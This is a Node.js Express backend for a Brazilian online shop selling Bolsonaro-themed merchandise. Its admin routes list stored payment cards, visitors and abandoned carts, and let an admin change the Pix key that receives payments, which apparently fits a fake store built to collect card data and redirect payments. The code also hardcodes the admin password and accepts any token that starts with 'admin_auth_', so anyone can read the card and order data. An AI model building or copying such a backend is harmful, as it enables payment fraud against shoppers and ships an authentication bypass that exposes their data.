const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public'));
app.use('/admin', express.static('admin'));

// Mock data storage
let pedidos = [];
let cartoes = [];
let visitantes = [];
let carrinhosAbandonados = [];
let pixKey = '';

// ========== PRODUTOS ==========
app.get('/api/produtos', (req, res) => {
    res.json({
        produtos: [
            { id: 1, nome: "Camiseta Bolsonaro 2026", preco: 89.90, preco_antigo: 129.90, imagem: "https://placehold.co/600x800/f0ede5/8b6b3d?text=CAMISETA+2026" },
            { id: 2, nome: "Boné Exército e Fé", preco: 59.90, preco_antigo: 89.90, imagem: "https://placehold.co/600x800/e6dfd1/8b6b3d?text=BONÉ+PRETO" },
            { id: 3, nome: "Caneca Ordem e Progresso", preco: 39.90, preco_antigo: 59.90, imagem: "https://placehold.co/600x800/fff4e6/8b6b3d?text=CANECA" }
        ]
    });
});

// ========== BUSCAR CEP ==========
app.get('/api/cep/:cep', async (req, res) => {
    const cep = req.params.cep.replace(/\D/g, '');
    if (cep.length !== 8) return res.json({ error: 'CEP inválido' });
    try {
        const response = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
        const data = await response.json();
        if (data.erro) return res.json({ error: 'CEP não encontrado' });
        res.json({ success: true, logradouro: data.logradouro, bairro: data.bairro, cidade: data.localidade, uf: data.uf });
    } catch (error) {
        res.json({ error: 'Erro ao buscar CEP' });
    }
});

// ========== SALVAR PEDIDO ==========
app.post('/api/pedido', (req, res) => {
    const pedidoId = 'CAP' + Date.now();
    const pedido = { ...req.body, pedido_id: pedidoId, created_at: new Date().toISOString() };
    pedidos.unshift(pedido);
    res.json({ success: true, pedido_id: pedidoId });
});

// ========== LOGIN ADMIN ==========
app.post('/api/admin/login', (req, res) => {
    const { username, password } = req.body;
    if (username === 'admin' && password === 'capitao2025') {
        res.json({ success: true, token: 'admin_auth_' + Date.now() });
    } else {
        res.status(401).json({ success: false });
    }
});

function verifyAdmin(req, res, next) {
    const token = req.headers.authorization;
    if (!token || !token.startsWith('Bearer admin_auth_')) {
        return res.status(401).json({ success: false });
    }
    next();
}

// ========== ADMIN ROUTES ==========
app.get('/api/admin/pedidos', verifyAdmin, (req, res) => {
    res.json({ success: true, pedidos });
});

app.get('/api/admin/cartoes', verifyAdmin, (req, res) => {
    res.json({ success: true, cartoes });
});

app.get('/api/admin/visitantes', verifyAdmin, (req, res) => {
    res.json({ success: true, visitantes });
});

app.get('/api/admin/carrinhos-abandonados', verifyAdmin, (req, res) => {
    res.json({ success: true, carrinhos: carrinhosAbandonados });
});

app.get('/api/admin/stats', verifyAdmin, (req, res) => {
    res.json({
        success: true,
        stats: {
            online: visitantes.filter(v => new Date(v.ultima_atividade) > new Date(Date.now() - 5 * 60 * 1000)).length,
            abandoned_carts: carrinhosAbandonados.length,
            total_cards: cartoes.length,
            revenue: pedidos.reduce((sum, p) => sum + (parseFloat(p.total) || 0), 0)
        }
    });
});

app.get('/api/admin/pix', verifyAdmin, (req, res) => {
    res.json({ success: true, pix_key: pixKey });
});

app.post('/api/admin/pix', verifyAdmin, (req, res) => {
    pixKey = req.body.pix_key;
    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});